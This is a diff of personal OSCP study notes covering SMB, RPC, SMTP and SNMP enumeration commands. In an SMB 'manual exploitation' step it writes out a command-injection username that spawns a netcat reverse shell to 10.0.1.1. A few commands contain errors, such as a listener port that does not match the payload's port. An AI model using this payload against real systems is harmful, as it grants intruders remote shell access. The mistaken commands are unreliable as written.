@@ -6,36 +6,80 @@ https://github.com/erx01/oscp-prep-notes/tree/main
 
 
 ## Active Information Gathering
-**Perform Port Scanning with Netcat and Nmap**
 **Enumerate DNS, SMB, SMTP, and SNMP Servers**
+**Perform Port Scanning with Netcat and Nmap**
+
 ### SMB Enumeration
+Network file sharing protocol that enables different devices to transfer data and for software to exchange data with hardware. 
+- Runs on TCP 139 and 445
+- Enabled by default on Windows systems
+- Requires manual enabling on Linux systems
+- Often referred to as CIFS (Common Internet File System)
+- Allows any folder to be shared across a network.
+
 ```
 // Nmap scripts
 nmap -p 445 --script smb-enum-shares <Target-IP>
 
-// Enumerating shares
+// Enumerating shares (smbclient)
 // smbclient anonymous login 
 smbclient -L <Target-IP> -N 
-
-// 
 smbclient -L <Target-IP>
 
 // smbmap - lists shares, shows permissions (read.write)
-smbmap -d . -H <IP-target>
+smbmap -H <IP-target>
 
-// 
-
+// Manual exploitation
+smbclient //<target-IP>/share
+// In another terminal run a netcat listener
+nc -lvmp 443
+// Once the nc listener is running and you are logged in, run:
+"/=`nc 10.0.1.1 4444 -e /bin/bash`"
 ```
 - Initial Probing with Nmap Scripts (NSE)
   - `smb-os-discovery`: this script confirms OS, computer name, and domain - can provide crucial context about target.
   - `smb-protocols`: this script can determine which versions of SMB protocol are supported.
  
 - Enumerating Shares
-
+Anything with a '$' at the end is a hidden share
 - `ADMIN$`: An administrative IPC share
 - `IPCS$`" A default IPC share used for inter-process communication
-- `
+- `opt`: A disk tree share
 
+### RPCclient 
+rpcclient is a tool that allows us to take advantage of smb anonymous login and provides various commands for info gathering:
+- querydominfo - provides information on the server
+- enumdomusers - lists users on the system
+- queryuser (username) - displays detailed information about a specific user
+- netshareenumall - enumerates all shares
+
+```
+rpcclient -u "" <target-IP>
+```
+
+#### SMTP - Simple Mail Transfer Protocol
+Used for sending email.
+- Runs on TCP port 25
+- Primarily useful for information gathering and enumeration during security assessments
+
+To enumerate SMTP we will use banner grabbing. This reveals the SMTP server version and other potentially useful information.
+```
+nc -nv <target-IP> 
+```
+### SNMP Enumeration
+Simple Network Management Protocol often contains a wealth of information about a system (system info, users, services, etc.) if the common community string `public` is used. 
+
+**Enumeration with Nmap script**
+- `sU` flag specifies a UDP scan (SNMP runs on UDP)
+- `snmp-brute` script perfomrs a brute-force attack against the SNMP community string (password).
+```
+nmap -sU -p 161 --script snmp-brute <target-IP> 
+```
+
+SMB: Anonymous read/write access on a share (`opt`) allows for direct data theft or malware deployment.
+SMTP: if the `VRFY` command is enabled, it allows for user enumeration.
+SNMP: The default community string `public` is active, leaking system details and the entire user list. 
+---
 
 **Apply Living Off the Land Techniques**
 
